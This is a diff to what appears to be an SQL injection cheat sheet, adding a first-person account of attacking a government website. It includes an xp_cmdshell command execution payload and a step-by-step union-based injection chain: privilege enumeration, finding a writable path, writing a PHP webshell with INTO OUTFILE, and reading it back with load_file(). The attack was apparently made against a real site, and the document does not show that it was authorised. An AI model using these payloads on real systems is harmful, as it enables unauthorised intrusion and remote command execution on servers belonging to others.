@@ -90,3 +90,31 @@ Since the webshell is upload, you can go execute OS Commands:
 
 Via **xp_cmdshell**:  
 ```something'); exec xp_cmdshell "ping 10.10.x.x"--``` 
+
+## Real life scenario
+
+Below is a simple writeup of how I managed to upload a webshell in a gov website. Using the following query I found out that column 7 was vulnerable:  
+```http://xxxx.gov.xx/redacted/redactedphpfile?aid=1 union select 1,2,3,4,5,6,7,8--```  
+
+Let's enumerate the user's privilege:  
+```http://xxxx.gov.xx/redacted/redactedphpfile?aid=1 union select 1,2,3,4,5,6,(SELECT+GROUP_CONCAT(GRANTEE,0x202d3e20,IS_GRANTABLE,0x3c62723e)+FROM+INFORMATION_SCHEMA.USER_PRIVILEGES),8--```  
+
+The output looks promising, the user j**** has writing permission, which mean we can write arbitrary files:  
+![privilege_check_output](https://i.imgur.com/G8HR7Tq.jpg)
+
+Now it's time to find an existing path so we know where to write our webshell. For this I am going to use some global variables (which we already discussed [here](https://github.com/kleiton0x00/Advanced-SQL-Injection-Cheatsheet/tree/main/Privilege%20Escalation#finding-absolute-path))  
+```http://xxxx.gov.xx/redacted/redactedphpfile?aid=1 union select 1,2,3,4,5,6,@@slave_load_tmpdir,8--```  
+
+The output is:  
+```C:\xampp\tmp```
+
+Great, so now let's upload a webshell to **C:\xampp\tmp**:  
+```http://xxxx.gov.xx/redacted/redactedphpfile?aid=1 union select 1,2,3,4,5,6,"<?php system($_GET['cmd']); ?>",8 into outfile 'C:/xampp/tmp/webshell.php'--```  
+
+I tried to find a way how to access our webshell, but since it is uploaded on /tmp directory, there was no chance to directly access it. In this case, we use **load_file()** function.
+```http://xxxx.gov.xx/redacted/redactedphpfile?aid=1 union select 1,2,3,4,5,6,load_file('C:/xampp/tmp/webshell.php'),8--```  
+
+If we see the source-code of the response, we can see our webshell uploaded:  
+![webshell_uploaded](https://i.imgur.com/tyR6cp2.png)
+
+Note: This is a simple PoC, in real-life pentest engagements, you might prefer uploading a proper webshell instead, since it is easier to interact with it.
